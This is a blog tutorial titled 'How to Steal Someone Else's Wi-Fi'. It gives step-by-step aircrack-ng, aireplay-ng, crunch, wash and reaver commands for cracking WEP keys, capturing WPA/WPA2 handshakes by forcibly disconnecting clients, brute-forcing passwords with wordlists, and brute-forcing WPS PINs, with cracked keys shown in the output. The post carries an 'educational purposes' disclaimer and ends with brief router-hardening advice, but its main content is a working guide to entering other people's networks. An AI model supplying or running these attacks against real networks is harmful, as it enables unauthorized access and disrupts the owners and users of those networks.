# How to Steal Someone Else’s Wi-Fi

_5 min read · August 18, 2025 · by muhdsyahirk_

---

## Entry Log

In this mini-blog, I will be guiding you steps-by-steps on how to steal someone else’s Wi-Fi. By stealing someone else’s Wi-Fi, I mean, we connect to that Wi-Fi and then we can use it for browsing internet or any other activities that require internet connection. My method, however, is an outdated method since I believe that many routers are currently using a more secure way in securing their Wi-Fi, but, I also believe that some of the Wi-Fi owners didn’t really use something strong to secure their Wi-Fi (i.e. weak Wi-Fi password).

Requirements:

1. Kali Linux
2. Wireless Adapter
3. Nearby Wi-Fi to steal

Tools covered:

1. Aircrack-ng
2. Wifite
3. Reaver
4. Wordlist
5. Crunch

> **WARNING** Since I still consider myself a beginner, some of you might think that this tutorial is trash, moreover, my English is not that great. So, don’t read or follow if you value your time.

> **DISCLAIMER** This mini-blog’s content is intended solely for educational purposes. I take no responsibility for any abuse of this material, nor do I support unlawful activity.

---

## Step 1: Search for Wi-Fi around us

In this step, we will be searching for nearby Wi-Fi. But before that, we need our wireless adapter in monitor mode. To do that,

```bash
ifconfig *network_interface* down
airmon-ng check kill
iwconfig *network_interface* mode monitor
ifconfig *network_interface* up
```

Now, to search nearby Wi-Fi:

```bash
airodump-ng *network_interface*
```

By writing this command, we will then see this output:

![Airodump-ng.png](./img/wifi/Airodump-ng.png)

- BSSID = MAC address
- PWR = From my understanding, it’s like ‘ping’ = the lower, the better the connection (ignore ‘-’)
- Data = The higher, the busier the network
- CH = Channel
- ENC = Security protocol
- ESSID = Wi-Fi name

From here, we have identified active Wi-Fi around us. We can then choose which one do we want to steal from. Keep in mind that the ENC & CH is important, the BSSID will be used a lot later and all of the tutorials here require monitor mode.

---

## Step 2: Gaining Access to the chosen Wi-Fi

Now, we will then continue our attack which is gaining access. But before that, we need to understand first the differences between WEP, WPA & WPA2 because each of them have different methods that we need to use to successfully steal the Wi-Fi

### WEP

WEP was the first Wi-Fi security protocol. It’s now considered not secure due to the encryption that it uses (RC4) with static keys. Read here for more details https://www.kaspersky.com/resource-center/definitions/wep-vs-wpa

Now let me explain a little bit about RC4 Cipher. RC4 uses secret network key, and combined it with 24-bit IV, it will then become the key stream. However, this IV is sent in plaintext with each packet, and also it’s too short (24-bit) so it will be repeated.

So how do we crack password from WEP protocol? We can do **Fake Authentication Attack** combined with **ARP Request Replay Attack**. It’s simple, we need to use three terminals:

1. One for capturing a lot of packets and also the IVs.
2. One for associating with the Router (Fake Authentication).
3. And the other one will wait for ARP packet, and then it will ask the Router to generate a lot of IVs (ARP Request Replay).

1st terminal’s commands:

```bash
airodump-ng --bssid *bssid* --channel *channel* --write *file_name* *network_interface*
```

2nd terminal’s commands:

Refer first 12 alphanumerical on ‘unspec’ on _ifconfig_ for _netw-iface-mac_:

```bash
aireplay-ng --fakeauth 0 -a *bssid* -h *netw_iface_mac* *network_interface*
```

3rd terminal’s commands:

```bash
aireplay-ng --arpreplay -a *bssid* -h *netw_iface_mac* *network_interface*
```

Now we go back to the 2nd terminal:

```bash
aircrack-ng *file_name*
```

Output:

![WEP-crack-output.png](./img/wifi/WEP-crack-output.png)

Bomba! We got the key which is ‘1F1F1F’. We can now connect to the Wi-Fi using ASCII password (not shown in the image above) or the key.

### WPA & WPA2

WPA & WPA2 is the modern Wi-Fi security protocol and it’s widely used in most of the routers. Again, read here for more details https://www.kaspersky.com/resource-center/definitions/wep-vs-wpa. WPA & WPA2 has a feature called WPS. I will cover on how to crack password when WPS enabled later.

So how do we crack password for WPA & WPA2? It’s not really that simple as WEP, it’s more resource-intensive & time consuming since we need to use wordlist for brute forcing.

First, we need to capture handshake. Before that, what is a ‘handshake’? Handshake happens when a client connects to the network. You might be thinking, “This is hard since we don’t know when a client will try to connect to the network”, well, you’re right and wrong at the same time because we can disconnect a user from the network (Deauth), and when that user tries to reconnect, we can then capture the handshake.

First, we need to capture and store all packets (most importantly, the handshake):

```bash
airodump-ng --bssid *bssid* --channel *channel* --write *file_name* *network_interface*
```

And then we disconnect a user from the output above:

```bash
aireplay-ng --deauth *count* -a *bssid* -c *client_mac network_interface*
```

Then we get the packet captured file.

Now we can do brute force for finding the correct password for that Wi-Fi:

```bash
aircrack-ng *handshake_file* -w *wordlist_file*
```

For the wordlist, we can create our own simple file where we list all the passwords like this:

```bash
password
pass_123
123_pass
admin123
```

Or we can generate our own wordlist based on the range & charset that we give:

```bash
crunch *min-length max-length charset(123abc$)* -o *file_name.txt* -t *pattern*
```

Or we can use the files that are provided here:

```bash
ls -lh /usr/share/wordlists/
```

Output:

![WPA-crack-output.png](./img/wifi/WPA-crack-output.png)

Bomba! The Wi-Fi password is ‘biscotte’.

### WPS

What is WPS? WPS is a simple way to connect to Wi-Fi without typing the password. It’s mainly used by printer, smart TV and IOTs for easier connection. To do the connection (legally), we need to push the physical button on the router or use the pin code.

So how do we crack WPS enabled Wi-Fi that’s using pin code? We need two terminals for this:

1. One for checking the WPS & keeping the connection between us & router (Fake Auth).
2. And the other one is for brute forcing the pin.

For the 1st terminal, we check for WPS:

```bash
wash --interface *network_interface*
```

Still in the 1st terminal, we keep the connection alive every _delay_ seconds so that reaver below can do its work:

```bash
aireplay-ng --fakeauth *delay* -a *bssid* -h *netw_iface_mac* *network_interface*
```

In the 2nd terminal, we do the brute force:

```bash
reaver -b *bssid* --channel *channel* -i *network_interface* -vvv --no-associate
```

Output:

![WPS-Crack-output.png](./img/wifi/WPS-Crack-output.png)

Bomba! The password is on ‘WPA PSK’, which is ‘UAURWSXR’.

---

## Limitations

### WEP

WEP is considered obsolete nowadays, thus no router is using it anymore.

### WPA & WPA2

Have you ever heard someone says “imagine using brute force in the big 2025”? Yea, brute force is irrelevant nowadays because of majority of the Wi-Fi owners are asked to enter a strong password for their Wi-Fi.

### WPS

If the owner disable WPS feature, you can do nothing.

---

## How to secure your Wi-Fi

### WEP

- Well, the only way is to upgrade to the latest security protocol or change your router to a latest one.

### WPA & WPA2

- For WPA & WPA2, you need to use a very strong password so that it’s hard for the attacker to brute force your password.
- Your password must contains:
  - 12+ chars
  - uppercase
  - lowercase
  - numbers
  - symbols

### WPS

- If your router has WPS feature, you either need to disable it or enable PBC (Push Button Configuration) for the easy connection.

---

## Session Terminated

Well, thank you for staying with me until the end of this post. I know that this guide is trash, but I hope you learned something from it, see you later!
